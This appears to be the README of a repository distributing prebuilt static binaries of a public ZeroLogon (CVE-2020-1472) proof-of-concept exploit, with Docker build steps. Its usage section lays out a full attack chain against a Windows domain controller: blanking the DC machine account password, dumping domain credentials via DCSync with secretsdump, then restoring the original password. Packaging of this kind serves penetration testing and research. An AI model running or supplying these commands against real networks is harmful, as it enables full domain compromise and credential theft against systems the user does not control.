# ZeroLogon - dirkjanm CVE-2020-1472 static binaries

### Description

This repository contains static standalone binaries for Windows and Linux (both
x64) of [dirkjanm's
CVE-2020-1472 POC](https://github.com/dirkjanm/CVE-2020-1472) Python scripts:
`cve-2020-1472-exploit.exe` and `restorepassword.exe`. All credit goes to Tom
Tervoort for the [original research](https://www.secura.com/blog/zero-logon)
and Dirk-jan Mollema for the Python scripts.

The build process is heavily based on work from [ropnop's
impacket_static_binaries](https://github.com/ropnop/impacket_static_binaries).
Windows and Linux binaries are built using
[PyInstaller](http://www.pyinstaller.org/), executed in [cdrx's docker
image](https://github.com/cdrx/docker-pyinstaller). The Linux binaries are
built in Ubuntu 12.04 running Glibc 2.15 and should thus be compatible with
any version of Glibc newer than 2.15.

The main motivation behind this work is to have tooling to restore the DC
machine account password from Windows operating systems.

### Build the binaries yourself

The binaries can be build directly from sources using the provided `Makefile`
after retrieving the `cdrx/pyinstaller-windows` / `cdrx/pyinstaller-linux`
docker images. The newly compiled binaries will be placed in the `tmp_build`
folder.

```
# If necessary, to refresh the impacket and CVE-2020-1472 repositories cloned in tmp_build
make clean

# Windows
docker pull cdrx/pyinstaller-windows
make windows

# Linux
docker pull cdrx/pyinstaller-linux
make linux
```

### Usage

```
# Sets an empty password for the targeted DC machine account.
cve-2020-1472-exploit_windows.exe "<DC_NETBIOS_NAME>" "<DC_IP>"

# DCSync using the DC machine account.
# Static version of secretsdump.py: https://github.com/ropnop/impacket_static_binaries
secretsdump_windows.exe -just-dc -no-pass "<DOMAIN>/<DC_MACHINE_ACCOUNT$>@<DC_IP>"

# Retrieves the original DC machine account password.
# A secretsdump.exe binary built after impacket's September 15th 2020 update should be used (as it will automatically dump the plaintext machine password hex encoded required for the restoration).
secretsdump_windows.exe -hashes ":<NTLM>" "<DOMAIN>/<Administrator | DA_USERNAME>@<DC_IP>"

# Restores the DC machine account's original password.
restorepassword_windows.exe -target-ip "<DC_IP>" -hexpass "<DC_MACHINE_ACCOUNT_HEX_PASSWORD>" "<DOMAIN>/<DC_HOSTNAME>@<DC_HOSTNAME>"
```
